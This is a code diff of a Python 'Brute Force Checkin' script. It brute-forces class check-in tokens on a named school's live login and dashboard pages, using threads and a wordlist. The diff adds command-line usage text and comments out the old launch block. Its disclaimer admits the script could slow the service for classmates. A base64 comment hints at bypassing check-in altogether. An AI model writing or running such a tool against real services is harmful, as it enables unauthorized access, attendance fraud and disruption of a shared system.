@@ -2,45 +2,55 @@
 
 """Brute Force Checkin module
 
-#!Disclaimer: 
+#!Disclaimer:
 
-    The network administrator will see the spike in network 
-    requests. Not only will you potentially slow down 
+    The network administrator will see the spike in network
+    requests. Not only will you potentially slow down
     services for your classmates but also be very obvious
-    as to who is trying/succeeds in using brute-force to check-in to class. 
-    You are in control of your own actions and will face the consequences 
-    if used for maliscious intention. This script is for the curious 
+    as to who is trying/succeeds in using brute-force to check-in to class.
+    You are in control of your own actions and will face the consequences
+    if used for maliscious intention. This script is for the curious
     and more proof of concept.
-    
-Hypothetical: 
-        
+
+Hypothetical:
+
     VGhlcmUgbWF5IGV4aXN0IGEgd2F5IG9
     mIGNoZWNraW5nIGluIHdpdGhvdXQga2
     5vd2luZyB0aGUgdG9rZW4gKG5vdCB1c
     2luZyBicnV0ZSBmb3JjZSkuLi4uaWYg
     eW91IGp1c3QgbG9vayBpbiB0aGUgcml
     naHQgcGxhY2VzLiA7KSA=
-        
-"""
 
-from html.parser import HTMLParser
+Usage:
+    brute
+    brute -h|--help
+    brute -v|--version
+Options:
+    -h --help  Show help screen.
+    -v --version  Show version.
+"""
+__maintainer__ = 'Gary Frederick'
+__version__ = '1.0.0'
+__license__ = 'MIT'
+
+
+# Built-in Python Modules
 import urllib.request
 import urllib.parse
-import http.cookiejar
-import queue
 import threading
+import queue
 import sys
 import os
+
+# External Python Modules
 import requests
 from lxml import html, etree
+from html.parser import HTMLParser
+import http.cookiejar
+import docopt
 
 
-__author__ = 'Gary Frederick'  # main contributor
-__latest_editor__ = None  # last user to edit document
-__date__ = 'November 26, 2019'  # last date edited
-__version__ = 0.1  # version number
-
-threads = 5
+threads = 5  # number of threads
 resume_word = None
 login_url = "https://makeschool.com/login/"
 dashboard_url = "https://makeschool.com/dashboard/"
@@ -206,13 +216,20 @@ class BruteParser(HTMLParser):
                     self.parsed_results[password_field] = password_field
 
 
-print("[*] Started HTML Form Brute-Forcer Script")
-print("[*] Building Token Queue")
-token_q = build_token_q("./wordlist/words.txt")
-if token_q.qsize():
-    print("[*] Password Queue Build Successful")
-    attempt_brute_force = BruteForcer(token_q)
-    attempt_brute_force.html_brute_forcer_thread_starter()
-else:
-    print("[!] Empty Password File!")
-    sys.exit(0)
+#
+# print("[*] Building Token Queue")
+# token_q = build_token_q("./wordlist/words.txt")
+# if token_q.qsize():
+#     print("[*] Password Queue Build Successful")
+#     attempt_brute_force = BruteForcer(token_q)
+#     attempt_brute_force.html_brute_forcer_thread_starter()
+# else:
+#     print("[!] Empty Password File!")
+#     sys.exit(0)
+
+if __name__ == "__main__":
+    arguments = docopt(__doc__, version=__version__)
+    if not len(sys.argv) > 1:
+        print("[*] Started HTML Form Brute-Forcer Script")
+    else:
+        print('Not an option check option list --help')
